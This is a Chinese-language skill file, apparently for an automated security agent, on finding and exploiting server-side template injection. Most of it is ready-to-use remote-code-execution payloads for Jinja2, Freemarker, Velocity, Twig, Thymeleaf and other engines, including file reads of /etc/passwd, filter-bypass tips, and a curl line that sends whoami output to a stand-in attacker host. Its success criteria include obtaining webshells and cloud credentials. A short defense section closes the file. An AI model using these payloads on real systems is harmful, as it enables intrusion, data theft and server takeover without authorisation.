---
name: web-ssti-001
description: "SSTI (Server-Side Template Injection) 检测与利用技术，用于发现和利用服务端模板注入漏洞 适用于: 应用使用模板引擎（Jinja2、Freemarker、Velocity、Twig、Pug、Thymeleaf）; 用户输入被直接嵌入模板; 模板内容允许动态解析表达式"
license: MIT
metadata:
  author: HOS-Sec-Engine
  version: 2026-06
  tags:
  - ssti
  - template-injection
  - server-side-template-injection
  - jinja2
  - freemarker
  - velocity
  - twig
  - thymeleaf
  - rce
  category: web
  risk-level: critical
  confidence: 0.89
---
# Server-Side Template Injection (SSTI)

SSTI（服务端模板注入）允许攻击者将恶意模板指令注入服务端模板引擎，实现 RCE、文件读取或敏感信息泄露。现代 Web 应用广泛使用模板引擎生成动态页面，当用户输入直接拼接到模板中而非通过安全的渲染接口传递时，模板引擎会解析用户输入中的模板指令，导致 SSTI 漏洞。

## 何时使用

### 触发场景

- 用户输入被嵌入模板中的变量输出（如 {{name}}、${name}）
- 应用将用户输入直接传递给模板渲染函数（如 render(user_input)）
- 错误消息暴露了使用的模板引擎名称和版本
- 邮件模板、PDF 生成、报告导出功能使用模板引擎
- CMS 或建站平台允许用户自定义页面模板
- 应用抛出模板相关的异常信息（TemplateError、ParseException）

### 关键词

`ssti`, `template injection`, `模板注入`, `jinja2`, `freemarker`, `velocity`, `twig`, `smarty`, `thymeleaf`, `pug`, `jade`, `handlebars`, `mustache`, `mako`, `tornado`, `flask`, `express`, `spring boot`, `rce via template`, `服务端模板注入`

### 识别指标

- URL 参数或 POST body 中的值被直接显示在页面中
- 输入 {{7*7}}、${7*7} 等测试 payload 页面返回 49
- 输入 #{7*7} 或 *{7*7} 等测试 payload
- 错误信息暴露模板引擎类型
- 应用使用 .ftl、.vm、.twig、.jade、.pug 等模板扩展名
- 响应头包含 X-Powered-By: Express、Server: Flask 等信息

### 别名

`服务端模板注入`, `模板执行`, `template RCE`, `spring SSTI`, `flask SSTI`, `exploit SSTI`, `模板解析`

## 操作检查清单

1. 识别模板引擎类型（通过错误信息、技术栈、响应头、URL 命名）
2. 基础探测：输入 {{7*7}}、${7*7}、#{7*7}、*{7*7}、{{7*'7'}}
3. 非数字盲测：输入 {{'test'|upper}} 或 ${"test".toUpperCase()}
4. 确认渲染上下文（HTML、JavaScript、URL、属性值）
5. 测试能否读取配置信息：{{config}}、${application}
6. 测试能否访问 Java/Python 对象和方法
7. 测试能否执行系统命令（根据引擎不同选择 payload）
8. 尝试绕过 WAF/过滤器（编码、嵌套、注释语法）
9. 测试横向访问：文件读取、数据库连接
10. 验证 RCE：执行 id、whoami、ls 等命令

## 技术手段

- Java 模板引擎：
  - Freemarker：<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
  - Velocity：#set($x='')#$x.class.forName('java.lang.Runtime').getRuntime().exec('id')
  - Thymeleaf：${T(java.lang.Runtime).getRuntime().exec('id')}
- Python 模板引擎：
  - Jinja2：{{ ''.__class__.__mro__[1].__subclasses__() }}
  - Mako：${self.module.cache.util.os.popen('id').read()}
  - Tornado：{% import os %}{{os.popen('id').read()}}
- Node.js 模板引擎：
  - Pug/Jade：#{function(){return global.process.mainModule.require('child_process').execSync('id')}()}
  - Handlebars：{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id')"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
- PHP 模板引擎：
  - Twig：{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
  - Smarty：{php}echo system('id');{/php}
- 盲 SSTI：使用 sleep、ping 等延时探测
- 上下文感知 payload 构造：字符串拼接、URL 编码输出

## 实战经验

### 症状

- 页面显示 {{7*7}} 未解释 → 非 SSTI（被转义）
- 页面显示 49 → 确认 SSTI（Jinja2/Freemarker 等）
- 页面显示 7777777 → 可能是 Jinja2（字符串重复）
- 输入特殊字符触发模板错误信息
- 错误页面包含模板引擎名称（如 FreeMarker template error）
- 输入 ${7*7} 页面空白或显示 14（Java 模板）

### 根因分析

- 用户输入直接传递给模板渲染函数（如 render(template_string, user_input)）
- 模板中直接拼接用户输入：${"Welcome " + user_name}
- 使用 eval 或 Runtime.exec 替代安全的模板渲染
- 模板引擎配置为允许执行任意 Java/Python 方法
- 未正确配置 Sandbox 或限制模板功能
- 使用不安全的方法将用户输入作为模板内容处理

### 实战观察

- Java 模板引擎（Freemarker、Velocity）更容易实现 RCE
- Jinja2 RCE 需要找到可用的 __subclasses__() 链
- Thymeleaf 通常需要修改模板文件本身
- Pug/Handlebars 的 SSTI 利用链更复杂
- 现代框架（Spring Boot、Flask）对 SSTI 有内置保护但配置不当仍存在风险
- 邮件模板是 SSTI 的高频发生场景
- Python 应用中 Flask/Jinja2 的 SSTI 最常见
- Freemarker 的 Execute 类在 2.3.30+ 版本中已被移除

### 常见错误

- 只测试 {{7*7}} 不测试 ${7*7}（不同引擎语法各异）
- 未识别模板引擎类型即开始暴力尝试 payload
- 忽略上下文（HTML 中 vs JS 字符串中）直接注入
- 使用过时的 payload（如 Freemarker Execute 类在新版本不可用）
- 未考虑编码绕过（HTML 实体、URL 编码）

### 补充说明

- SSTI 的严重程度远高于反射型 XSS，因为 SSTI 发生在服务端
- 不同模板引擎的语法差异巨大，识别引擎是最关键的第一步
- 盲 SSTI 检测通过观察页面结构变化或响应时间差异
- 在同一模板引擎中，不同版本的利用链可能完全不同
- SSTI 漏洞奖金通常很高（HackerOne 上常见中高危）

## 示例

### Jinja2 SSTI 基础探测

识别 Python Jinja2 模板引擎并执行系统命令

```
基础探测:
输入: {{7*7}}        → 输出: 49（确认 SSTI）
输入: {{7*'7'}}      → 输出: 7777777（Jinja2 将字符串重复 7 次）
输入: {{config}}      → 输出: Flask 配置（确认 Flask + Jinja2）

Python 对象链访问:
{{ ''.__class__.__mro__[1].__subclasses__() }}
→ 返回所有子类列表，寻找可用的 RCE 类（如 subprocess.Popen、os._wrap_close）

常用 RCE Payload:
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ url_for.__globals__['current_app'].config }}

实用 RCE:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

### Freemarker SSTI RCE

Java Freemarker 模板引擎注入实现 RCE

```
基础探测:
输入: ${7*7}         → 输出: 49
输入: ${7*'7'}       → 输出: 7777777（Freemarker 字符串重复）

Freemarker RCE (< 2.3.30):
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

Freemarker RCE (>= 2.3.30, Execute 移除):
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign cl=classLoader.loadClass("java.lang.Runtime")>
<#assign meth=cl.getDeclaredMethod("getRuntime")>
<#assign rt=meth.invoke(null)>
<#assign exec=rt.exec("id")>

或使用 ObjectConstructor:
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder","id").start()}

Spring + Freemarker:
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

### Velocity SSTI RCE

Java Velocity 模板引擎注入

```
基础探测:
输入: #set($x=7*7)$x  → 输出: 49

Velocity RCE:
#set($x='')#$x.class.forName('java.lang.Runtime').getRuntime().exec('id')
#set($e="e")#set($x=$e.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null))
$x.exec('id')
#set($str=$x.class.forName('java.lang.StringBuilder'))
#set($input=$str.newInstance())
$input.append('id')
$input.toString()
```

### Twig SSTI RCE

PHP Twig 模板引擎注入

```
基础探测:
输入: {{7*7}}        → 输出: 49
输入: {{'test'|upper}} → 输出: TEST

Twig RCE (< 1.20):
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

Twig RCE (1.20+):
{{['id']|filter('system')}}

其他 Twig payload:
{{app.request.server.get('SERVER_ADDR')}}
{{app.request.query.filter(0,0,{'options':'system'})}}
{{['ls -la']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
```

### Thymeleaf SSTI RCE

Spring Boot Thymeleaf 模板注入

```
基础探测:
输入: ${7*7}          → 输出: 49
输入: *{7*7}          → 输出: 49

Thymeleaf Spring Expression (SpEL):
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com/$(whoami)')}

Spring Boot 利用:
${T(org.apache.commons.io.IOUtils).toString(
    T(java.lang.Runtime).getRuntime().exec(
        T(java.lang.Character).toString(105).concat(
            T(java.lang.Character).toString(100)
        )
    ).getInputStream()
)}

更隐蔽的方式:
${#exec.getRuntime()?.exec('id')}
${#runtime.getRuntime()?.exec('id')}
```

## 验证标准

### 验证指标

- 模板表达式在输出中被解析执行（如 {{7*7}} 输出 49）
- 模板函数被执行（如 {{config}} 输出配置信息）
- 系统命令执行成功并返回输出
- 敏感文件被成功读取并显示
- 外部请求被触发（DNS/HTTP 回调）

### 成功标志

- 确认模板引擎类型和版本
- 成功执行系统命令（whoami、id 等）
- 读取服务器敏感文件
- 获取 RCE 或 WebShell
- 获取数据库连接信息或云凭证

### 误报标志

- 模板表达式原样输出（引擎已转义或不是 SSTI）
- 服务端执行了表达式但未返回结果（盲 SSTI 需进一步确认）
- 命令执行成功但受限于 Sandbox 或安全策略
- 错误输出来自客户端而非服务端

## 防御建议

### 推荐做法

- 使用模板引擎的安全 API（render with context 而非直接拼接用户输入）
- 用户输入作为数据值传递到模板，不参与模板内容构造
- 启用模板沙箱（Sandbox）限制模板中可访问的类和方法
- 禁止模板中使用危险函数（Runtime.exec、ProcessBuilder、eval）
- 模板内容来自开发者控制而非用户上传
- 定期更新模板引擎到最新版本
- 实施 Content Security Policy (CSP) 限制 RCE 的影响

### 缓解措施

- 对用户输入进行严格的模板语法转义
- 使用白名单模板目录，禁止动态模板加载
- 分离模板逻辑和用户数据（MVC 模式）
- 实施最小权限原则，Web 应用不以 root 运行
- 对模板渲染功能实施监控和告警
- 使用 SAST 工具检测模板注入风险

## 参考链接

- https://portswigger.net/research/server-side-template-injection
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- https://www.onsecurity.io/blog/server-side-template-injection-with-java-spring/
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html
